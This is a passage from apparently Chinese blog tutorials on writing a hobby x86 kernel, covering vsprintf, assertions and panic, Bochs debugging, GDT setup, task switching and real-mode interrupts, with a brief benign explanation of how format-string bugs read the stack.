&lt;= &#x27;9&#x27;)// 将字符数字串转换成整数，并将指针前移static int skip_atoi(const char **s)&#123; int i = 0; while (is_digit(**s)) i = i * 10 + *((*s)++) - &#x27;0&#x27;; return i;&#125;// 将整数转换为指定进制的字符串// str - 输出字符串指针// num - 整数// base - 进制基数// size - 字符串长度// precision - 数字长度(精度)// flags - 选项static char *number(char *str, unsigned long num, int base, int size, int precision, int flags)&#123; char c, sign, tmp[36]; const char *digits = &quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; int i; int index; char *ptr = str; // 如果 flags 指出用小写字母，则定义小写字母集 if (flags &amp; SMALL) digits = &quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;; // 如果 flags 指出要左对齐，则屏蔽类型中的填零标志 if (flags &amp; LEFT) flags &amp;= ~ZEROPAD; // 如果进制基数小于 2 或大于 36，则退出处理 // 也即本程序只能处理基数在 2-32 之间的数 if (base &lt; 2 || base &gt; 36) return 0; // 如果 flags 指出要填零，则置字符变量 c=&#x27;0&#x27;，否则 c 等于空格字符 c = (flags &amp; ZEROPAD) ? &#x27;0&#x27; : &#x27; &#x27;; // 如果 flags 指出是带符号数并且数值 num 小于 0，则置符号变量 sign=负号，并使 num 取绝对值 if (flags &amp; SIGN &amp;&amp; num &lt; 0) &#123; sign = &#x27;-&#x27;; num = -num; &#125; else // 否则如果 flags 指出是加号，则置 sign=加号，否则若类型带空格标志则 sign=空格，否则置 0 sign = (flags &amp; PLUS) ? &#x27;+&#x27; : ((flags &amp; SPACE) ? &#x27; &#x27; : 0); // 若带符号，则宽度值减 1 if (sign) size--; // 若 flags 指出是特殊转换，则对于十六进制宽度再减少 2 位(用于0x) if (flags &amp; SPECIAL) &#123; if (base == 16) size -= 2; // 对于八进制宽度减 1（用于八进制转换结果前放一个零） else if (base == 8) size--; &#125; i = 0; // 如果数值 num 为 0，则临时字符串=&#x27;0&#x27;；否则根据给定的基数将数值 num 转换成字符形式 if (num == 0) tmp[i++] = &#x27;0&#x27;; else while (num != 0) &#123; index = num % base; num /= base; tmp[i++] = digits[index]; &#125; // 若数值字符个数大于精度值，则精度值扩展为数字个数值 if (i &gt; precision) precision = i; // 宽度值 size 减去用于存放数值字符的个数 size -= precision; // 从这里真正开始形成所需要的转换结果，并暂时放在字符串 str 中 // 若 flags 中没有填零(ZEROPAD) 和左对齐（左调整）标志 // 则在 str 中首先填放剩余宽度值指出的空格数 if (!(flags &amp; (ZEROPAD + LEFT))) while (size-- &gt; 0) *str++ = &#x27; &#x27;; // 若需带符号位，则存入符号 if (sign) *str++ = sign; // 若 flags 指出是特殊转换 if (flags &amp; SPECIAL) &#123; // 则对于八进制转换结果头一位放置一个&#x27;0&#x27; if (base == 8) *str++ = &#x27;0&#x27;; // 对于十六进制则存放&#x27;0x&#x27; else if (base == 16) &#123; *str++ = &#x27;0&#x27;; *str++ = digits[33]; &#125; &#125; // 若 flags 中没有左调整（左对齐）标志, 则在剩余宽度中存放 c 字符（&#x27;0&#x27;或空格） if (!(flags &amp; LEFT)) while (size-- &gt; 0) *str++ = c; // 此时 i 存有数值 num 的数字个数 // 若数字个数小于精度值，则 str 中放入（精度值-i）个&#x27;0&#x27; while (i &lt; precision--) *str++ = &#x27;0&#x27;; // 将转数值换好的数字字符填入 str 中，共 i 个 while (i-- &gt; 0) *str++ = tmp[i]; // 若宽度值仍大于零 // 则表示 flags 标志中有左对齐标志标志 // 则在剩余宽度中放入空格 while (size-- &gt; 0) *str++ = &#x27; &#x27;; return str;&#125;int vsprintf(char *buf, const char *fmt, va_list args)&#123; int len; int i; // 用于存放转换过程中的字符串 char *str; char *s; int *ip; // number() 函数使用的标志 int flags; int field_width; // 输出字段宽度 int precision; // min 整数数字个数；max 字符串中字符个数 int qualifier; // &#x27;h&#x27;, &#x27;l&#x27; 或 &#x27;L&#x27; 用于整数字段 // 首先将字符指针指向 buf // 然后扫描格式字符串， // 对各个格式转换指示进行相应的处理 for (str = buf; *fmt; ++fmt) &#123; // 格式转换指示字符串均以 &#x27;%&#x27; 开始 // 这里从 fmt 格式字符串中扫描 &#x27;%&#x27;，寻找格式转换字符串的开始 // 不是格式指示的一般字符均被依次存入 str if (*fmt != &#x27;%&#x27;) &#123; *str++ = *fmt; continue; &#125; // 下面取得格式指示字符串中的标志域，并将标志常量放入 flags 变量中 flags = 0; repeat: // 掉过第一个 % ++fmt; switch (*fmt) &#123; // 左对齐调整 case &#x27;-&#x27;: flags |= LEFT; goto repeat; // 放加号 case &#x27;+&#x27;: flags |= PLUS; goto repeat; // 放空格 case &#x27; &#x27;: flags |= SPACE; goto repeat; // 是特殊转换 case &#x27;#&#x27;: flags |= SPECIAL; goto repeat; // 要填零(即&#x27;0&#x27;)，否则是空格 case &#x27;0&#x27;: flags |= ZEROPAD; goto repeat; &#125; // 取当前参数字段宽度域值，放入 field_width 变量中 field_width = -1; // 如果宽度域中是数值则直接取其为宽度值 if (is_digit(*fmt)) field_width = skip_atoi(&amp;fmt); // 如果宽度域中是字符 &#x27;*&#x27;，表示下一个参数指定宽度 else if (*fmt == &#x27;*&#x27;) &#123; ++fmt; // 因此调用 va_arg 取宽度值 field_width = va_arg(args, int); // 若此时宽度值小于 0，则该负数表示其带有标志域 &#x27;-&#x27; 标志（左对齐） if (field_width &lt; 0) &#123; // 因此还需在标志变量中添入该标志，并将字段宽度值取为其绝对值 field_width = -field_width; flags |= LEFT; &#125; &#125; // 取格式转换串的精度域，并放入 precision 变量中 precision = -1; // 精度域开始的标志是&#x27;.&#x27; 其处理过程与上面宽度域的类似 if (*fmt == &#x27;.&#x27;) &#123; ++fmt; // 如果精度域中是数值则直接取其为精度值 if (is_digit(*fmt)) precision = skip_atoi(&amp;fmt); // 如果精度域中是字符&#x27;*&#x27;，表示下一个参数指定精度 else if (*fmt == &#x27;*&#x27;) &#123; // 因此调用 va_arg 取精度值 precision = va_arg(args, int); &#125; // 若此时宽度值小于 0，则将字段精度值取为其绝对值 if (precision &lt; 0) precision = 0; &#125; // 下面这段代码分析长度修饰符，并将其存入 qualifer 变量 qualifier = -1; if (*fmt == &#x27;h&#x27; || *fmt == &#x27;l&#x27; || *fmt == &#x27;L&#x27;) &#123; qualifier = *fmt; ++fmt; &#125; // 下面分析转换指示符 switch (*fmt) &#123; // 如果转换指示符是&#x27;c&#x27;，则表示对应参数应是字符 case &#x27;c&#x27;: // 此时如果标志域表明不是左对齐， if (!(flags &amp; LEFT)) // 则该字段前面放入 (宽度域值 - 1) 个空格字符，然后再放入参数字符 while (--field_width &gt; 0) *str++ = &#x27; &#x27;; *str++ = (unsigned char)va_arg(args, int); // 如果宽度域还大于 0，则表示为左对齐 // 则在参数字符后面添加 (宽度值-1) 个空格字符 while (--field_width &gt; 0) *str++ = &#x27; &#x27;; break; // 如果转换指示符是 &#x27;s&#x27;，则表示对应参数是字符串 case &#x27;s&#x27;: s = va_arg(args, char *); // 首先取参数字符串的长度 len = strlen(s); // 若其超过了精度域值, 则扩展精度域=字符串长度 if (precision &lt; 0) precision = len; else if (len &gt; precision) len = precision; // 此时如果标志域表明不是左对齐 if (!(flags &amp; LEFT)) // 则该字段前放入 (宽度值-字符串长度) 个空格字符 while (len &lt; field_width--) *str++ = &#x27; &#x27;; // 然后再放入参数字符串 for (i = 0; i &lt; len; ++i) *str++ = *s++; // 如果宽度域还大于 0，则表示为左对齐 // 则在参数字符串后面，添加(宽度值-字符串长度)个空格字符 while (len &lt; field_width--) *str++ = &#x27; &#x27;; break; // 如果格式转换符是&#x27;o&#x27;，表示需将对应的参数转换成八进制数的字符串 case &#x27;o&#x27;: str = number(str, va_arg(args, unsigned long), 8, field_width, precision, flags); break; // 如果格式转换符是&#x27;p&#x27;，表示对应参数的一个指针类型 case &#x27;p&#x27;: // 此时若该参数没有设置宽度域，则默认宽度为 8，并且需要添零 if (field_width == -1) &#123; field_width = 8; flags |= ZEROPAD; &#125; str = number(str, (unsigned long)va_arg(args, void *), 16, field_width, precision, flags); break; // 若格式转换指示是 &#x27;x&#x27; 或 &#x27;X&#x27; // 则表示对应参数需要打印成十六进制数输出 case &#x27;x&#x27;: // &#x27;x&#x27;表示用小写字母表示 flags |= SMALL; case &#x27;X&#x27;: str = number(str, va_arg(args, unsigned long), 16, field_width, precision, flags); break; // 如果格式转换字符是&#x27;d&#x27;, &#x27;i&#x27; 或 &#x27;u&#x27;，则表示对应参数是整数 case &#x27;d&#x27;: case &#x27;i&#x27;: // &#x27;d&#x27;, &#x27;i&#x27;代表符号整数，因此需要加上带符号标志 flags |= SIGN; // &#x27;u&#x27;代表无符号整数 case &#x27;u&#x27;: str = number(str, va_arg(args, unsigned long), 10, field_width, precision, flags); break; // 若格式转换指示符是 &#x27;n&#x27; // 表示要把到目前为止转换输出的字符数保存到对应参数指针指定的位置中 case &#x27;n&#x27;: // 首先利用 va_arg() 取得该参数指针 ip = va_arg(args, int *); // 然后将已经转换好的字符数存入该指针所指的位置 *ip = (str - buf); break; default: // 若格式转换符不是 &#x27;%&#x27;，则表示格式字符串有错 if (*fmt != &#x27;%&#x27;) // 直接将一个 &#x27;%&#x27; 写入输出串中 *str++ = &#x27;%&#x27;; // 如果格式转换符的位置处还有字符，则也直接将该字符写入输出串中 // 然后继续循环处理格式字符串 if (*fmt) *str++ = *fmt; else // 否则表示已经处理到格式字符串的结尾处，则退出循环 --fmt; break; &#125; &#125; // 最后在转换好的字符串结尾处添上字符串结束标志 *str = &#x27;\\0&#x27;; // 返回转换好的字符串长度值 i = str - buf; return i;&#125;// 结果按格式输出字符串到 bufint sprintf(char *buf, const char *fmt, ...)&#123; va_list args; va_start(args, fmt); int i = vsprintf(buf, fmt, args); va_end(args); return i;&#125; 可以改写src/kernel/main.c了 123456789101112131415161718192021#include &lt;xsys/xsys.h&gt;#include &lt;xsys/types.h&gt;#include &lt;xsys/io.h&gt;#include &lt;xsys/console.h&gt;#include &lt;xsys/stdio.h&gt;char message[] = &quot;HELLO XSYS\\n&quot;;char buf[1024];void kernel_init()&#123; console_init(); int count=31; while(count--) &#123; // console_write(message, sizeof(message) - 1); printk(&quot;hello xsys %#010d\\n&quot;, count); &#125; return;&#125; 字符串格式化漏洞の一点补充 在之前的文章里面讲过了，但是这次可以从新的视角出发 123456789#include &lt;stdio.h&gt;int main()&#123; char msg[] = &quot;XSYS\\n&quot;; int a = 10; printf(&quot;hello %d %s %d %d\\n&quot;, a, msg, 0xaa, 0xff); return 0;&#125; 1gcc -m32 -g -o test test.c 这里使用32位是为了不让参数传到寄存器中，这样参数在栈上面方便调试 gcc这里使用的时标准的cdecl(c declearation)，所以我们的参数是从右往左入栈，及图中的4个push 在call之前的栈如下 所以当vsprintf检测到格式化字符串时，他就会将栈顶的值按照提前预定的格式输出出来。 所以对字符串格式化漏洞利用来说，重要的是call vsprintf时，栈的情况 操作系统实现-断言与调试 代码来源：https://github.com/StevenBaby/onix 相关课程：https://www.bilibili.com/video/BV1gR4y1u7or 感谢B站UP：踌躇月光 带来的相关代码和教程 断言 如果要判断一个条件是否成立，可以有 1234if (exp) ....;else ERROR; 每个判断都这样写的话会导致代码异常难读，所以可以使用一个函数assert()来实现 而我们的assert()肯定要打印出错的代码文件、哪一行、报错提示信息 不过还好之前我们在printk中实现了这一点 src/include/xsys/assert.h 1234567891011121314#ifndef XSYS_ASSERT_H#define XSYS_ASSERT_Hvoid assertion_failure(char *exp, char *file, char *base, int line);#define assert(exp) \\ if (exp) \\ ; \\ else \\ assertion_failure(#exp, __FILE__, __BASE_FILE__, __LINE__)void panic(const char *fmt, ...);#endif src/kernel/assert.c 12345678910111213141516171819202122#include &lt;xsys/assert.h&gt;#include &lt;xsys/stdarg.h&gt;#include &lt;xsys/types.h&gt;#include &lt;xsys/stdio.h&gt;#include &lt;xsys/printk.h&gt;static u8 buf[1024];void assertion_failure(char *exp, char *file, char *base, int line)&#123; printk( &quot;\\n--&gt; assert(%s) failed!!!\\n&quot; &quot;--&gt; file: %s \\n&quot; &quot;--&gt; base: %s \\n&quot; &quot;--&gt; line: %d \\n&quot;, exp, file, base, line); spin(&quot;assertion_failure()&quot;); // 不可能走到这里，否则出错； asm volatile(&quot;ud2&quot;);&#125; src/kernel/main.c 12345678910111213141516171819#include &lt;xsys/xsys.h&gt;#include &lt;xsys/types.h&gt;#include &lt;xsys/io.h&gt;#include &lt;xsys/console.h&gt;#include &lt;xsys/stdio.h&gt;#include &lt;xsys/assert.h&gt;#include &lt;xsys/debug.h&gt;// #include &lt;xsys/global.h&gt;char message[] = &quot;HELLO XSYS\\n&quot;;char buf[1024];void kernel_init()&#123; console_init(); assert(3&lt;5); assert(3&gt;5); return;&#125; PANIC 慌乱 当我们代码过多，测试阶段不可避免地会写一些bug，可能导致例如：x/0这种，会触发系统的崩溃，所以我们要对这种致命错误(Fatal Error)要有处理 src/kernel/assert.c 12345678910111213void panic(const char *fmt, ...)&#123; va_list args; va_start(args, fmt); int i = vsprintf(buf, fmt, args); va_end(args); printk(&quot;!!! panic !!!\\n--&gt; %s \\n&quot;, buf); spin(&quot;panic()&quot;); // 不可能走到这里，否则出错； asm volatile(&quot;ud2&quot;);&#125; src/kernel/main.c 123456789101112131415161718#include &lt;xsys/xsys.h&gt;#include &lt;xsys/types.h&gt;#include &lt;xsys/io.h&gt;#include &lt;xsys/console.h&gt;#include &lt;xsys/stdio.h&gt;#include &lt;xsys/assert.h&gt;#include &lt;xsys/debug.h&gt;// #include &lt;xsys/global.h&gt;char message[] = &quot;HELLO XSYS\\n&quot;;char buf[1024];void kernel_init()&#123; console_init(); panic(&quot;test!!!\\n&quot;); return;&#125; 调试 bochs中的断点是：xchg bx,bx 所以我们通过裸汇编来实现断点，同时显示停止在了那个文件的哪一行 src/include/xsys/debug.h 123456789#ifndef XSYS_DEBUG_H#define XSYS_DEBUG_Hvoid debug_k(char* file, int line, const char* fmt, ...);#define BMB asm volatile (&quot;xchgw %bx, %bx&quot;)#define DEBUGK(fmt, args...) debug_k(__BASE_FILE__, __LINE__, fmt, ##args)#endif src/kernel/debug.c 1234567891011121314#include &lt;xsys/debug.h&gt;#include &lt;xsys/stdarg.h&gt;#include &lt;xsys/printk.h&gt;#include &lt;xsys/stdio.h&gt;static char buf[1024];void debug_k(char* file, int line, const char* fmt, ...)&#123; va_list args; va_start(args, fmt); vsprintf(buf, fmt, args); printk(&quot;[%s] [%d] %s&quot;, file, line, fmt);&#125; src/kernel/main.c 1234567891011121314151617181920#include &lt;xsys/xsys.h&gt;#include &lt;xsys/types.h&gt;#include &lt;xsys/io.h&gt;#include &lt;xsys/console.h&gt;#include &lt;xsys/stdio.h&gt;#include &lt;xsys/assert.h&gt;#include &lt;xsys/debug.h&gt;#include &lt;xsys/global.h&gt;char message[] = &quot;HELLO XSYS\\n&quot;;char buf[1024];void kernel_init()&#123; console_init(); BMB; assert(3&lt;5); DEBUGK(&quot;debug test&quot;); return;&#125; 操作系统实现-内核全局描述符|进程调度及上下文切换 内核全局描述符 将loader.asm里面全局描述功能放到内核里面（确实，你不觉得这样汇编一位一位的设置很麻烦吗？） 12descriptor_t gdt[GDT_SIZE]; // 内核全局描述符表pointer_t gdt_ptr; // 内核全局描述符表指针 之前的汇编 12lgdt [gdt_ptr]; 加载 gdtsgdt [gdt_ptr]; 保存 gdt src/include/xsys/global.h 123456789101112131415161718192021222324252627282930313233343536373839404142#ifndef ONIX_GLOBAL_H#define ONIX_GLOBAL_H#include &lt;xsys/types.h&gt;#define GDT_SIZE 128// 全局描述符typedef struct descriptor_t /* 共 8 个字节 */&#123; unsigned short limit_low; // 段界限 0 ~ 15 位 unsigned int base_low : 24; // 基地址 0 ~ 23 位 16M unsigned char type : 4; // 段类型 unsigned char segment : 1; // 1 表示代码段或数据段，0 表示系统段 unsigned char DPL : 2; // Descriptor Privilege Level 描述符特权等级 0 ~ 3 unsigned char present : 1; // 存在位，1 在内存中，0 在磁盘上 unsigned char limit_high : 4; // 段界限 16 ~ 19; unsigned char available : 1; // 该安排的都安排了，送给操作系统吧 unsigned char long_mode : 1; // 64 位扩展标志 unsigned char big : 1; // 32 位 还是 16 位; unsigned char granularity : 1; // 粒度 4KB 或 1B unsigned char base_high; // 基地址 24 ~ 31 位&#125; _packed descriptor_t;// 段选择子typedef struct selector_t&#123; u8 RPL : 2; u8 TI : 1; u16 index : 13;&#125; selector_t;// 全局描述符表指针typedef struct pointer_t&#123; u16 limit; u32 base;&#125; _packed pointer_t;void gdt_init();#endif src/kernel/global.c 1234567891011121314151617181920212223#include &lt;xsys/global.h&gt;#include &lt;xsys/string.h&gt;#include &lt;xsys/debug.h&gt;descriptor_t gdt[GDT_SIZE]; // 内核全局描述符表pointer_t gdt_ptr; // 内核全局描述符表指针// 初始化内核全局描述符表void gdt_init()&#123; BMB; DEBUGK(&quot;init gdt!!!\\n&quot;); asm volatile(&quot;sgdt gdt_ptr&quot;); memcpy(&amp;gdt, (void *)gdt_ptr.base, gdt_ptr.limit + 1); gdt_ptr.base = (u32)&amp;gdt; gdt_ptr.limit = sizeof(gdt) - 1; BMB; asm volatile(&quot;lgdt gdt_ptr\\n&quot;); BMB;&#125; src/kernel/main.c 123456789101112131415161718#include &lt;xsys/xsys.h&gt;#include &lt;xsys/types.h&gt;#include &lt;xsys/io.h&gt;#include &lt;xsys/console.h&gt;#include &lt;xsys/stdio.h&gt;#include &lt;xsys/assert.h&gt;#include &lt;xsys/debug.h&gt;#include &lt;xsys/global.h&gt;char message[] = &quot;HELLO XSYS\\n&quot;;char buf[1024];void kernel_init()&#123; console_init(); gdt_init(); return;&#125; 这里是MBR最开始的GDT，也是第一个断点 在执行lgdt ds:addr后 这样就扩充到了127个GDT 拓展 在linux内核中是如何实现的 到了保护模式，内存管理分为段式，和段页式，也就是段模式必不可少 对段模式来说，访问一个内存仍然用的【段基地址：偏移地址】 GDT：把这些长度为64bit的段描述符放入一个数组中，而将段寄存器中的值作为下标索引来间接引用 段描述符 ​ 同样的在源码中有 ​ /arch/x86/include/asm/desc_defs.h 12345678910111213141516171819202122232425262728293031323334353637#ifndef __ASSEMBLY__#include &lt;linux/types.h&gt;/* 8 byte segment descriptor */struct desc_struct &#123; u16 limit0; u16 base0; u16 base1: 8, type: 4, s: 1, dpl: 2, p: 1; u16 limit1: 4, avl: 1, l: 1, d: 1, g: 1, base2: 8;&#125; __attribute__((packed));#define GDT_ENTRY_INIT(flags, base, limit) \\ &#123; \\ .limit0 = (u16) (limit), \\ .limit1 = ((limit) &gt;&gt; 16) &amp; 0x0F, \\ .base0 = (u16) (base), \\ .base1 = ((base) &gt;&gt; 16) &amp; 0xFF, \\ .base2 = ((base) &gt;&gt; 24) &amp; 0xFF, \\ .type = (flags &amp; 0x0f), \\ .s = (flags &gt;&gt; 4) &amp; 0x01, \\ .dpl = (flags &gt;&gt; 5) &amp; 0x03, \\ .p = (flags &gt;&gt; 7) &amp; 0x01, \\ .avl = (flags &gt;&gt; 12) &amp; 0x01, \\ .l = (flags &gt;&gt; 13) &amp; 0x01, \\ .d = (flags &gt;&gt; 14) &amp; 0x01, \\ .g = (flags &gt;&gt; 15) &amp; 0x01, \\ &#125;.../* LDT or TSS descriptor in the GDT. */...struct desc_ptr &#123; unsigned short size; unsigned long address;&#125; __attribute__((packed)) ; 在/arch/x86/include/asm/desc.h定义了一个描述符数组，则为gdt 123struct gdt_page &#123; struct desc_struct gdt[GDT_ENTRIES];&#125; __attribute__((aligned(PAGE_SIZE))); 最后更具这个找到gdt的相关应用就行了 进程调度及上下文切换 在32位下，参数传递是通过栈传递的，但是具体的信息会保存到寄存器中，所以我们为了不修改寄存器的值，有一套调用规则。主要有SystemV规则和Posix规则 ​ System V The System V Interface Definition (SVID) is a standard that describes the AT&amp;T UNIX System V behavior, including that of system calls, C libraries, available programs and devices. ​ Posix Portable Operating System Interface standards specified by IEEE to define application programming interface (API). POSIX covers all the three forms of IPC cdecl 函数实参在线程栈上按照从右至左的顺序依次压栈。 函数结果保存在寄存器EAX/AX/AL中 调用者负责从线程栈中弹出实参（即清栈） 受到函数调用影响的寄存器（volatile registers）：EAX, ECX, EDX, ST0 - ST7, ES, GS 不受函数调用影响的寄存器： EBX, EBP, ESP, EDI, ESI, CS, DS 因为函数调用的时候不受函数调用影响的寄存器： EBX, EBP, ESP, EDI, ESI, CS, DS，我们简化为EBX、ESI、EDI，所以我们需要保存这些 src/kernel/schedule.asm 1234567891011121314151617181920212223global task_switchtask_switch: push ebp mov ebp, esp push ebx push esi push edi mov eax, esp; and eax, 0xfffff000; current mov [eax], esp mov eax, [ebp + 8]; next mov esp, [eax] pop edi pop esi pop ebx pop ebp ret 为了理解上面的其他细节，我们假设有这么一种情况：我们同时有两个函数（任务|进程）A、B，两者需要相互切换，且连两个程序跑起来的时候都是在栈上面，其中的栈就是内核栈(kernel stack) 1234typedef struct task_t&#123; u32 *stack; // 内核栈&#125; task_t; 因为系统是32位的，所以栈可以暂时表示32位数组 进程创建的时候，我们要初始化进程相对应的栈 1234567891011121314static void task_create(task_t *task, target_t target)&#123; u32 stack = (u32)task + PAGE_SIZE; stack -= sizeof(task_frame_t); task_frame_t *frame = (task_frame_t *)stack; frame-&gt;ebx = 0x11111111; frame-&gt;esi = 0x22222222; frame-&gt;edi = 0x33333333; frame-&gt;ebp = 0x44444444; frame-&gt;eip = (void *)target; task-&gt;stack = (u32 *)stack;&#125; 当A向B切换的时候，我们就需要得到当前进程的内存地址，保存相关信息（EBX ESI EDI），这个相关信息就是任务上下文 调度函数可有： 123456void schedule()&#123; task_t *current = running_task(); task_t *next = current == a ? b : a; task_switch(next);&#125; 那么对于最开始的schedule.asm就有： 最开始的保存栈信息 将 ebx esi edi 压入栈保存 将当前栈顶esp转到eax上面，再将eax&amp;0xfffff000得到下一个任务的地址，再将当前栈顶转移到下一个任务地址中 将传入的next值转移到eax中作为返回值，再将下一个任务的地址转到栈顶中 最后再pop恢复栈平衡，返回后就可以到下一个任务了 src/include/xsys/task.h 123456789101112131415161718192021222324#ifndef XSYS_TASK_H#define XSYS_TASK_H#include &lt;xsys/types.h&gt;typedef u32 target_t();typedef struct task_t&#123; u32 *stack; // 内核栈&#125; task_t;typedef struct task_frame_t&#123; u32 edi; u32 esi; u32 ebx; u32 ebp; void (*eip)(void);&#125; task_frame_t;void task_init();#endif src/kernel/task.c 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &lt;xsys/task.h&gt;#include &lt;xsys/printk.h&gt;#include &lt;xsys/debug.h&gt;#define PAGE_SIZE 0x1000task_t *a = (task_t *)0x1000;task_t *b = (task_t *)0x2000;extern void task_switch(task_t *next);task_t *running_task()&#123; asm volatile( &quot;movl %esp, %eax\\n&quot; &quot;andl $0xfffff000, %eax\\n&quot;);&#125;void schedule()&#123; task_t *current = running_task(); task_t *next = current == a ? b : a; task_switch(next);&#125;u32 thread_a()&#123; while (true) &#123; printk(&quot;A&quot;); schedule(); &#125;&#125;u32 thread_b()&#123; while (true) &#123; printk(&quot;B&quot;); schedule(); &#125;&#125;static void task_create(task_t *task, target_t target)&#123; u32 stack = (u32)task + PAGE_SIZE; stack -= sizeof(task_frame_t); task_frame_t *frame = (task_frame_t *)stack; frame-&gt;ebx = 0x11111111; frame-&gt;esi = 0x22222222; frame-&gt;edi = 0x33333333; frame-&gt;ebp = 0x44444444; frame-&gt;eip = (void *)target; task-&gt;stack = (u32 *)stack;&#125;void task_init()&#123; task_create(a, thread_a); task_create(b, thread_b); schedule();&#125; src/kernel/main.c 1234567891011121314151617181920#include &lt;xsys/xsys.h&gt;#include &lt;xsys/types.h&gt;#include &lt;xsys/io.h&gt;#include &lt;xsys/console.h&gt;#include &lt;xsys/stdio.h&gt;#include &lt;xsys/assert.h&gt;#include &lt;xsys/debug.h&gt;#include &lt;xsys/global.h&gt;#include &lt;xsys/task.h&gt;char message[] = &quot;HELLO XSYS\\n&quot;;char buf[1024];void kernel_init()&#123; console_init(); gdt_init(); task_init(); return;&#125; 调试 有如下两个断点 这里的汇编我无法定位到具体文件，所以得gdb看一下了 得到current=0x1000 再通过task_switch切换 当前任务（A）的值被压入了栈中，然后再次得到当前栈的信息，之后将esp信息保存到*eax即0x1000中 再将下一个任务的地址放入到esp中 然后我们就可以切换到任务B的栈 小总结 目前的工程文件树： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263joe1sn@ubuntu:~/Desktop/os2$ tree.├── build│ ├── boot│ │ ├── boot.bin│ │ └── loader.bin│ ├── kernel│ │ ├── assert.o│ │ ├── console.o│ │ ├── debug.o│ │ ├── global.o│ │ ├── io.o│ │ ├── main.o│ │ ├── printk.o│ │ ├── schedule.o│ │ ├── start.o│ │ └── task.o│ ├── kernel.bin│ ├── lib│ │ ├── string.o│ │ └── vsprintf.o│ ├── master.img│ ├── system.bin│ └── system.map└── src ├── bochsrc ├── boot │ ├── boot.asm │ └── loader.asm ├── include │ └── xsys │ ├── assert.h │ ├── console.h │ ├── debug.h │ ├── global.h │ ├── io.h │ ├── printk.h │ ├── stdarg.h │ ├── stdio.h │ ├── string.h │ ├── task.h │ ├── types.h │ └── xsys.h ├── kernel │ ├── assert.c │ ├── console.c │ ├── debug.c │ ├── global.c │ ├── io.asm │ ├── main.c │ ├── printk.c │ ├── schedule.asm │ ├── start.asm │ └── task.c ├── lib │ ├── string.c │ └── vsprintf.c ├── makefile └── tests ├── test └── test.c11 directories, 48 files 文件启动方式 引用 https://en.wikipedia.org/wiki/X86_calling_conventions#syscall https://github.com/StevenBaby/onix 操作系统实现-中断与系统调用 使用Linux的系统调用 从汇编出发，一般来说的第一个程序是hello_world 123456789101112131415[bits 32]section .textglobal _start_start: mov ebx, 0 mov ecx, message mov edx, 13 mov eax, 4 int 0x80 retsection .datamessage: db &quot;hello world&quot;,10,13,0 这里使用了linux的int 0x80系统调用（调用表：https://www.joe1sn.top/int80.html ），调用的是write %eax Name Source %ebx %ecx %edx %ecx %edi 1 sys_exit kernel/exit.c int - - - - 2 sys_fork arch/i386/kernel/process.c struct pt_regs - - - - 3 sys_read fs/read_write.c unsigned int char * size_t - - 4 sys_write fs/read_write.c unsigned int const char * size_t - - ebx是选择IO通道（那个流） ecx是字符串的物理位置 edx是要打印的字符个数 eax是int 0x80要选择的系统调用号 1nasm -f elf32 hello_world.asm -o hello_world.o &amp;&amp; ld -m elf_i386 hello_world.o -o hello_world &amp;&amp; ./hello_world 因为我们直返回后程序没有退出的指令，所以出现了段错误 再次使用exit系统调用就可以避免这个错误了 12345678910111213141516[bits 32]section .textglobal _start_start: mov ebx, 0 mov ecx, message mov edx, 13 mov eax, 4 int 0x80 mov eax, 1 int 0x80section .datamessage: db &quot;hello world&quot;,10,13,0 实现一个系统调用 系统调用是基于中断实现的 一个普遍的思想就是操作系统是一个死循环，当满足一个条件时，中断循环去执行触发的功能(函数)（windows的点击-&gt;打开一个窗口），执行完成过后回到死循环。 修改我们的src/boot/boot.asm 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657[org 0x7c00];最简单的主程序引导程序;实模式的启动地址;设置屏幕模式为文本模式，清除屏幕mov ax,3int 0x10;初始化段寄存器mov ax,0mov ds,axmov es,axmov ss,axmov sp,0x7c00xchg bx,bxmov word [0x80 * 4], interruptmov word [0x80 * 4 + 2], 0int 0x80 ;linux系统调用 invoke 注册cs:ip;程序悬停jmp $interupt: mov si, string call print xchg bx,bx iret ;中断返回;实模式的打印print: mov ah, 0xe ;功能参数 .next: mov al, [si];字符 cmp al, 0 ;判断是否为最后一个结尾 jz .done ;结尾跳转至ret int 0x10 ;功能调用 inc si ;地址-1 jmp .next ;继续，下一个 .done: retstring: db &quot;.&quot;,0; \\n\\rerror: mov si, .msg call print hlt; CPU停止 jmp $ .msg db &quot;Kernel Booting Failed&quot;,10,13,0;填充times 510-($-$$) db 0db 0x55,0xaa 这里所有的一切都是先入为主的观念，因为我们并不了解上面hello_world的原理，我们在下一节从验证现在了解的知识 其中有： 123456xchg bx,bxmov word [0x80 * 4], interruptmov word [0x80 * 4 + 2], 0xchg bx,bxint 0x80 ;linux系统调用 invoke 注册cs:ipxchg bx,bx 我们将0x80*4的位置放入了interrupt的地址，下个断点看一下 我们成功的将interrupt函数的地址放到了int 0x80调用表的第0个位置，如果我们想使用int 0x70调用，就用： 123456xchg bx,bxmov word [0x70 * 4], interruptmov word [0x70 * 4 + 2], 0xchg bx,bxint 0x70 ;invoke 注册cs:ipxchg bx,bx 效果是一样的 再复习一下之前的知识：ds=0时，ds:0x100 的物理地址是0∗010h+100h=100h0*010h+100h=100h0∗010h+100h=100h 接着实现除0异常的系统调用 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162[org 0x7c00];最简单的主程序引导程序;实模式的启动地址;设置屏幕模式为文本模式，清除屏幕mov ax,3int 0x10;初始化段寄存器mov ax,0mov ds,axmov es,axmov ss,axmov sp,0x7c00; -------------------除0异常mov word [0 * 4], interruptmov word [0 * 4 + 2], 0mov dx, 0mov ax, 1mov bx, 0xchg bx, bxdiv bx; -------------------;程序悬停jmp $interrupt: mov si, string call print xchg bx,bx iret ;中断返回;实模式的打印print: mov ah, 0xe ;功能参数 .next: mov al, [si];字符 cmp al, 0 ;判断是否为最后一个结尾 jz .done ;结尾跳转至ret int 0x10 ;功能调用 inc si ;地址-1 jmp .next ;继续，下一个 .done: retstring: db &quot;.&quot;,0; \\n\\rerror: mov si, .msg call print hlt; CPU停止 jmp $ .msg db &quot;Kernel Booting Failed&quot;,10,13,0;填充times 510-($-$$) db 0db 0x55,0xaa 12345678mov word [0 * 4], interruptmov word [0 * 4 + 2], 0mov dx, 0mov ax, 1mov bx, 0xchg bx, bxdiv bx 